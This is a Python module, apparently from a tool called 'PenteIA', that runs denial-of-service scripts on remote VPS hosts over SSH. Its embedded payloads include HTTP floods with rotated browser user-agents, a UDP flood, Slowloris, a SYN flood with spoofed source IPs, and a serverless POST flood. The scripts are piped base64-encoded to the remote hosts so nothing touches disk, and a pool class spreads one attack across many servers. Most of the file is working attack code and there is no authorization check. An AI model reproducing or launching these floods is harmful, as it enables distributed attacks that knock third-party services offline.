#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
SSH Proxy Executor — PenteIA v4.0
Roteia testes DDoS por um VPS remoto via SSH.
O tráfego de teste parte do VPS, não da máquina local.
"""

import base64
import threading
import time
import random
from typing import Dict, Optional, Callable
from dataclasses import dataclass


@dataclass
class SSHProxyConfig:
    host: str
    port: int = 22
    user: str = ""
    password: str = ""


# Scripts executados no VPS remoto
_SCRIPT_HTTP_FLOOD = """\
import socket, ssl, time, threading, sys, os
print('PID ' + str(os.getpid()), flush=True)
host, port, dur, rps = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
count = [0]; errors = [0]; stop = [False]; start = time.time()
USE_SSL = port in (443, 8443)
UA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'python-requests/2.31.0',
]
PATHS = ['/', '/index.html', '/index.php', '/home', '/search?q=test',
         '/api/v1/status', '/products', '/login', '/sitemap.xml', '/robots.txt']
ctx = None
if USE_SSL:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
def worker():
    end = time.time() + dur; i = 0
    while time.time() < end and not stop[0]:
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((host, port))
            if ctx: s = ctx.wrap_socket(s, server_hostname=host)
            ua = UA[i % len(UA)]; path = PATHS[i % len(PATHS)]; i += 1
            req = ('GET ' + path + ' HTTP/1.1\\r\\nHost: ' + host + '\\r\\nUser-Agent: ' + ua +
                   '\\r\\nAccept: text/html,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nCache-Control: no-cache\\r\\nConnection: close\\r\\n\\r\\n')
            s.sendall(req.encode())
            s.close(); count[0] += 1
        except: errors[0] += 1
ts = [threading.Thread(target=worker, daemon=True) for _ in range(min(rps, 200))]
[t.start() for t in ts]
end_t = time.time() + dur
while time.time() < end_t:
    elapsed = int(time.time() - start); remaining = max(0, dur - elapsed)
    print('PROGRESS requests=' + str(count[0]) + ' errors=' + str(errors[0]) + ' elapsed=' + str(elapsed) + 's remaining=' + str(remaining) + 's', flush=True)
    time.sleep(5)
stop[0] = True; [t.join(timeout=2) for t in ts]
print('DONE requests=' + str(count[0]) + ' errors=' + str(errors[0]), flush=True)
"""

_SCRIPT_UDP_FLOOD = """\
import socket, time, os, sys
print('PID ' + str(os.getpid()), flush=True)
host, port, dur, pps = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
start = time.time(); end = time.time() + dur; count = 0; last = time.time()
while time.time() < end:
    try:
        s.sendto(os.urandom(512), (host, port)); count += 1
        if count % max(pps, 1) == 0: time.sleep(0.9)
    except: pass
    now = time.time()
    if now - last >= 5:
        elapsed = int(now - start); remaining = max(0, dur - elapsed)
        print('PROGRESS packets=' + str(count) + ' elapsed=' + str(elapsed) + 's remaining=' + str(remaining) + 's', flush=True)
        last = now
print('DONE packets=' + str(count), flush=True)
"""

_SCRIPT_SLOWLORIS = """\
import socket, time, sys, os
print('PID ' + str(os.getpid()), flush=True)
host, port, dur, conns = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
sockets = []; connected = 0
for _ in range(conns):
    try:
        s = socket.socket(); s.settimeout(4)
        s.connect((host, port))
        s.sendall(('GET / HTTP/1.1\\r\\nHost: ' + host + '\\r\\nContent-Length: 999\\r\\nX-Pad: ').encode())
        sockets.append(s); connected += 1
    except: pass
print('PROGRESS connections=' + str(connected) + ' elapsed=0s remaining=' + str(dur) + 's', flush=True)
start = time.time(); end = time.time() + dur; last = time.time()
while time.time() < end:
    for s in list(sockets):
        try: s.sendall(b'X')
        except: sockets.remove(s)
    time.sleep(1)
    now = time.time()
    if now - last >= 5:
        elapsed = int(now - start); remaining = max(0, dur - elapsed)
        print('PROGRESS connections=' + str(len(sockets)) + ' elapsed=' + str(elapsed) + 's remaining=' + str(remaining) + 's', flush=True)
        last = now
for s in sockets:
    try: s.close()
    except: pass
print('DONE connections=' + str(connected), flush=True)
"""

_SCRIPT_SYN_FLOOD = """\
import socket, time, os, sys, struct, random
print('PID ' + str(os.getpid()), flush=True)
host, port, dur, pps = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
count = 0; start = time.time(); last = time.time()
try:
    target_ip = socket.gethostbyname(host)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    end = time.time() + dur
    while time.time() < end:
        src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
        packet = b'\\x45\\x00\\x00\\x28' + os.urandom(2) + b'\\x40\\x00\\x40\\x06\\x00\\x00'
        packet += socket.inet_aton(src_ip) + socket.inet_aton(target_ip)
        packet += struct.pack('>HH', random.randint(1024,65535), port)
        packet += struct.pack('>II', random.randint(0,2**32-1), 0)
        packet += b'\\x50\\x02\\xff\\xff\\x00\\x00\\x00\\x00'
        s.sendto(packet, (target_ip, 0)); count += 1
        time.sleep(1.0/max(pps,1))
        now = time.time()
        if now - last >= 5:
            elapsed = int(now - start); remaining = max(0, dur - elapsed)
            print('PROGRESS packets=' + str(count) + ' elapsed=' + str(elapsed) + 's remaining=' + str(remaining) + 's', flush=True)
            last = now
except PermissionError:
    import threading
    def tcp_conn():
        end2 = time.time() + dur
        while time.time() < end2:
            try:
                s2 = socket.socket(); s2.settimeout(0.5)
                s2.connect((host, port)); s2.close()
            except: pass
    ts = [threading.Thread(target=tcp_conn) for _ in range(min(pps,50))]
    [t.start() for t in ts]
    end_t = time.time() + dur
    while time.time() < end_t:
        time.sleep(5)
        now = time.time(); elapsed = int(now - start); remaining = max(0, dur - elapsed)
        print('PROGRESS packets=' + str(count) + ' elapsed=' + str(elapsed) + 's remaining=' + str(remaining) + 's', flush=True)
    [t.join(timeout=2) for t in ts]
print('DONE packets=' + str(count), flush=True)
"""


_SCRIPT_HTTP_FLOOD_ASYNC = """\
import asyncio, ssl, sys, os, time
print('PID ' + str(os.getpid()), flush=True)
host, port, dur, concurrency = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
count = 0; errors = 0
USE_SSL = port in (443, 8443)
UA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Edg/119.0.0.0',
    'python-requests/2.31.0',
]
PATHS = ['/', '/index.html', '/index.php', '/home', '/search?q=test',
         '/api/v1/status', '/products', '/login', '/sitemap.xml', '/robots.txt']
ctx = None
if USE_SSL:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
async def worker(worker_id, end_time):
    global count, errors
    i = worker_id
    while asyncio.get_event_loop().time() < end_time:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx),
                timeout=3
            )
            ua = UA[i % len(UA)]; path = PATHS[i % len(PATHS)]; i += concurrency_val
            req = ('GET ' + path + ' HTTP/1.1\\r\\nHost: ' + host + '\\r\\nUser-Agent: ' + ua +
                   '\\r\\nAccept: text/html,*/*\\r\\nConnection: close\\r\\n\\r\\n')
            writer.write(req.encode()); await writer.drain()
            writer.close()
            try: await asyncio.wait_for(writer.wait_closed(), timeout=1)
            except: pass
            count += 1
        except: errors += 1
async def main():
    global concurrency_val
    concurrency_val = concurrency
    loop = asyncio.get_event_loop()
    start = loop.time(); end_time = start + dur
    workers = [asyncio.create_task(worker(i, end_time)) for i in range(concurrency)]
    last = loop.time()
    while loop.time() < end_time:
        await asyncio.sleep(5)
        elapsed = int(loop.time() - start); remaining = max(0, dur - elapsed)
        print('PROGRESS requests=' + str(count) + ' errors=' + str(errors) + ' elapsed=' + str(elapsed) + 's remaining=' + str(remaining) + 's', flush=True)
    await asyncio.gather(*workers, return_exceptions=True)
    print('DONE requests=' + str(count) + ' errors=' + str(errors), flush=True)
asyncio.run(main())
"""


_SCRIPT_SERVERLESS_FLOOD = """\
import asyncio, ssl, sys, os, time, random, string, json
print('PID ' + str(os.getpid()), flush=True)
host, port, dur, concurrency = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
endpoints_csv = sys.argv[5] if len(sys.argv) > 5 else '/api'
endpoints = [e.strip() for e in endpoints_csv.split(',') if e.strip()] or ['/api']
count = 0; errors = 0
USE_SSL = port in (443, 8443)
ctx = None
if USE_SSL:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
def rand_str(n): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
async def worker(worker_id, end_time):
    global count, errors
    i = worker_id
    while asyncio.get_event_loop().time() < end_time:
        path = endpoints[i % len(endpoints)]; i += concurrency_val
        body = json.dumps({"q": rand_str(12), "page": random.randint(1, 50), "ts": random.randint(100000, 999999)}).encode()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx), timeout=12
            )
            req = ('POST ' + path + ' HTTP/1.1\\r\\nHost: ' + host +
                   '\\r\\nContent-Type: application/json\\r\\nCache-Control: no-cache, no-store' +
                   '\\r\\nContent-Length: ' + str(len(body)) + '\\r\\nConnection: close\\r\\n\\r\\n')
            writer.write(req.encode() + body); await writer.drain()
            try: await asyncio.wait_for(reader.read(8192), timeout=12)
            except: pass
            writer.close()
            try: await asyncio.wait_for(writer.wait_closed(), timeout=2)
            except: pass
            count += 1
        except: errors += 1
async def main():
    global concurrency_val
    concurrency_val = concurrency
    loop = asyncio.get_event_loop()
    start = loop.time(); end_time = start + dur
    workers = [asyncio.create_task(worker(i, end_time)) for i in range(concurrency)]
    while loop.time() < end_time:
        await asyncio.sleep(5)
        elapsed = int(loop.time() - start); remaining = max(0, dur - elapsed)
        print('PROGRESS requests=' + str(count) + ' errors=' + str(errors) + ' elapsed=' + str(elapsed) + 's remaining=' + str(remaining) + 's', flush=True)
    await asyncio.gather(*workers, return_exceptions=True)
    print('DONE requests=' + str(count) + ' errors=' + str(errors), flush=True)
asyncio.run(main())
"""


def _friendly_ssh_error(e: Exception, host: str, port: int) -> str:
    """Converte exceções técnicas do paramiko em mensagens legíveis para iniciantes."""
    msg = str(e).lower()

    if 'unable to connect' in msg or 'connection refused' in msg:
        return (
            f"Não foi possível conectar na porta {port} do servidor {host}. "
            f"Verifique se o SSH está ativo nessa porta (tente a porta 22) "
            f"e se o firewall do VPS permite conexões nela."
        )
    if 'timed out' in msg or 'timeout' in msg:
        return (
            f"O servidor {host} demorou demais para responder (timeout). "
            f"Isso normalmente significa que o IP está errado, o VPS está desligado, "
            f"ou um firewall está bloqueando a porta {port} silenciosamente."
        )
    if 'authentication failed' in msg or 'permission denied' in msg:
        return (
            f"Usuário ou senha incorretos para {host}. "
            f"Confira se o usuário existe no servidor e se a senha está certa. "
            f"Dica: alguns VPS usam 'ubuntu', 'debian' ou 'ec2-user' ao invés de 'root'."
        )
    if 'no route to host' in msg or 'network unreachable' in msg:
        return (
            f"Não há caminho de rede até {host}. "
            f"O IP pode estar errado, o VPS pode estar desligado, "
            f"ou sua conexão com a internet está com problema."
        )
    if 'name or service not known' in msg or 'nodename nor servname' in msg or 'getaddrinfo' in msg:
        return (
            f"O endereço '{host}' não foi encontrado. "
            f"Verifique se digitou o IP ou hostname correto (sem espaços ou erros de digitação)."
        )
    if 'no existing session' in msg or 'ssh exception' in msg:
        return (
            f"O servidor {host} recusou a sessão SSH. "
            f"Pode ser que o serviço SSH esteja com problema ou sobrecarregado. Tente novamente."
        )
    if 'python3' in msg or 'python' in msg:
        return (
            f"Conectou no VPS mas Python 3 não está instalado. "
            f"Execute no servidor: sudo apt install python3"
        )

    # fallback com a mensagem original mas contextualizada
    return (
        f"Erro ao conectar em {host}:{port} — {e}. "
        f"Verifique o IP, porta, usuário e senha do seu VPS."
    )


class SSHProxyExecutor:
    """Executa testes DDoS em um VPS remoto via SSH."""

    def __init__(self, config: SSHProxyConfig):
        self.config = config

    def _client(self, timeout: int = 15):
        import paramiko
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(
            hostname=self.config.host,
            port=self.config.port,
            username=self.config.user,
            password=self.config.password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
        )
        return c

    def test_connection(self) -> Dict:
        """Testa conectividade SSH e retorna info do servidor."""
        try:
            c = self._client(timeout=10)
            _, out, _ = c.exec_command(
                'echo STATUS_OK && uname -srm && (python3 --version 2>&1 || echo no-python3)',
                timeout=10,
            )
            lines = out.read().decode().strip().split('\n')
            c.close()
            return {
                'ok': lines[0].strip() == 'STATUS_OK',
                'host': self.config.host,
                'os': lines[1].strip() if len(lines) > 1 else 'unknown',
                'python': lines[2].strip() if len(lines) > 2 else 'unknown',
            }
        except Exception as e:
            return {
                'ok': False,
                'error': _friendly_ssh_error(e, self.config.host, self.config.port),
            }

    def get_diagnostics(self) -> Dict:
        """Retorna CPU, memória, disco e carga do VPS."""
        try:
            c = self._client(timeout=10)
            _, out, _ = c.exec_command(
                'echo DIAG_OK && '
                'uptime && '
                'free -m | grep Mem && '
                'df -h / | tail -1 && '
                'nproc',
                timeout=10,
            )
            raw = out.read().decode().strip().split('\n')
            c.close()
            if not raw or raw[0].strip() != 'DIAG_OK':
                return {'ok': False, 'error': 'Resposta inesperada do servidor'}

            uptime_line  = raw[1].strip() if len(raw) > 1 else ''
            mem_line     = raw[2].strip() if len(raw) > 2 else ''
            disk_line    = raw[3].strip() if len(raw) > 3 else ''
            nproc        = raw[4].strip() if len(raw) > 4 else '?'

            # parse mem: "Mem: total used free ..."
            mem_parts = mem_line.split()
            mem_total = int(mem_parts[1]) if len(mem_parts) > 1 else 0
            mem_used  = int(mem_parts[2]) if len(mem_parts) > 2 else 0
            mem_free  = int(mem_parts[3]) if len(mem_parts) > 3 else 0
            mem_pct   = round(mem_used / mem_total * 100) if mem_total else 0

            # parse disk: "overlay 7.7G 6.4G 1.3G 84% /"
            disk_parts = disk_line.split()
            disk_used  = disk_parts[2] if len(disk_parts) > 2 else '?'
            disk_avail = disk_parts[3] if len(disk_parts) > 3 else '?'
            disk_pct   = disk_parts[4] if len(disk_parts) > 4 else '?'

            # load average from uptime: "... load average: 0.10, 0.12, 0.08"
            load = ''
            if 'load average:' in uptime_line:
                load = uptime_line.split('load average:')[1].strip()

            return {
                'ok': True,
                'host': self.config.host,
                'cpu_cores': nproc,
                'load_avg': load,
                'mem_total_mb': mem_total,
                'mem_used_mb': mem_used,
                'mem_free_mb': mem_free,
                'mem_pct': mem_pct,
                'disk_used': disk_used,
                'disk_avail': disk_avail,
                'disk_pct': disk_pct,
                'uptime': uptime_line,
            }
        except Exception as e:
            return {'ok': False, 'error': _friendly_ssh_error(e, self.config.host, self.config.port)}

    def _upload_and_run(self, script_src: str, args: list, duration: int) -> tuple:
        """Executa o script no VPS via stdin — sem escrever arquivo em disco."""
        result = {
            'status': 'running', 'packets': 0, 'requests': 0, 'connections': 0,
            'errors': 0, 'vps_pid': None, 'output': '', 'lines': [],
        }

        def _run():
            try:
                c = self._client(timeout=20)
                b64 = base64.b64encode(script_src.encode()).decode()
                str_args = " ".join(str(a) for a in args)
                # -u: stdout sem buffer — necessário para receber PROGRESS em tempo real
                cmd = f"echo '{b64}' | base64 -d | python3 -u - {str_args}"
                _, stdout, stderr = c.exec_command(cmd, timeout=duration + 90)

                # lê linha-a-linha enquanto o script roda
                for raw in iter(stdout.readline, ''):
                    line = raw.strip()
                    if not line:
                        continue
                    result['lines'].append(line)
                    # atualiza output incrementalmente para polling em tempo real
                    result['output'] = '\n'.join(result['lines'][-20:])
                    if line.startswith('PID '):
                        try:
                            result['vps_pid'] = int(line.split()[1])
                        except Exception:
                            pass
                    elif line.startswith('PROGRESS'):
                        for token in ('requests', 'packets', 'connections', 'errors'):
                            if f'{token}=' in line:
                                try:
                                    result[token] = int(line.split(f'{token}=')[1].split()[0])
                                except Exception:
                                    pass
                    elif line.startswith('DONE'):
                        for token in ('requests', 'packets', 'connections', 'errors'):
                            if f'{token}=' in line:
                                try:
                                    result[token] = int(line.split(f'{token}=')[1].split()[0])
                                except Exception:
                                    pass

                err_out = stderr.read().decode().strip()
                c.close()

                has_done = any('DONE' in l for l in result['lines'])
                if err_out and not has_done:
                    result['status'] = 'error'
                    result['error'] = err_out[:300]
                    result['lines'].append(f'ERROR: {err_out[:200]}')
                else:
                    result['status'] = 'completed'
                result['output'] = '\n'.join(result['lines'][-20:])
            except Exception as e:
                result['status'] = 'error'
                result['error'] = str(e)
                result['lines'].append(f'ERROR: {e}')

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        return t, result

    def kill_test(self, vps_pid: int) -> Dict:
        """Mata o processo no VPS pelo PID."""
        try:
            c = self._client(timeout=10)
            # SIGTERM primeiro, SIGKILL no processo inteiro incluindo filhos
            _, out, _ = c.exec_command(f'kill -- -{vps_pid} 2>/dev/null; kill {vps_pid} 2>/dev/null; echo OK', timeout=5)
            out.read()
            c.close()
            return {'ok': True}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def start_test(
        self,
        target_host: str,
        target_port: int,
        method: str,
        duration: int,
        pps: int,
        threads: int,
        endpoints: str = '',
    ) -> tuple:
        """Inicia o teste DDoS no VPS remoto. Retorna (thread, result_dict).

        Faz pré-check de conectividade na porta antes de lançar o script.
        Se a porta estiver fechada, retorna imediatamente com status='port_closed'.
        """
        import socket as _s
        try:
            _chk = _s.socket()
            _chk.settimeout(2)
            _chk.connect((target_host, target_port))
            _chk.close()
        except Exception as e:
            msg = f'Porta {target_port} fechada/filtrada — teste ignorado. ({e})'
            result = {
                'status': 'port_closed', 'packets': 0, 'requests': 0,
                'connections': 0, 'errors': 0, 'vps_pid': None,
                'output': msg, 'lines': [f'PORT_CLOSED port={target_port}'],
                'error': msg,
            }
            t = threading.Thread(target=lambda: None)
            t.start()
            return t, result

        scripts = {
            'http_flood':        (_SCRIPT_HTTP_FLOOD,       [target_host, target_port, duration, min(pps, 200)]),
            'http_flood_async':  (_SCRIPT_HTTP_FLOOD_ASYNC, [target_host, target_port, duration, min(pps, 2000)]),
            'udp_flood':         (_SCRIPT_UDP_FLOOD,        [target_host, target_port, duration, pps]),
            'slowloris':         (_SCRIPT_SLOWLORIS,        [target_host, target_port, duration, threads]),
            'syn_flood':         (_SCRIPT_SYN_FLOOD,        [target_host, target_port, duration, pps]),
            'dns_amplification': (_SCRIPT_HTTP_FLOOD,       [target_host, target_port, duration, min(pps, 200)]),
            'serverless_flood':  (_SCRIPT_SERVERLESS_FLOOD, [target_host, target_port, duration, min(pps, 1000), endpoints or '']),
        }
        script_src, args = scripts.get(method, scripts['http_flood'])
        return self._upload_and_run(script_src, args, duration)


class SSHProxyPool:
    """Pool de múltiplos VPS — distribui testes DDoS em paralelo por vários IPs."""

    def __init__(self, configs: List[SSHProxyConfig]):
        self.executors = [SSHProxyExecutor(cfg) for cfg in configs]

    def start_distributed_test(
        self,
        target_host: str,
        target_port: int,
        method: str,
        duration: int,
        pps: int,
        threads: int,
        endpoints: str = '',
    ) -> List[Dict]:
        """Inicia o teste em todos os VPS simultaneamente.
        Retorna lista de dicts com {vps_host, thread, result, executor}.
        """
        pps_each = max(10, pps // len(self.executors))
        nodes = []
        for executor in self.executors:
            thread, result = executor.start_test(
                target_host, target_port, method, duration, pps_each, threads, endpoints=endpoints
            )
            nodes.append({
                'vps_host': executor.config.host,
                'thread': thread,
                'result': result,
                'executor': executor,
            })
        return nodes
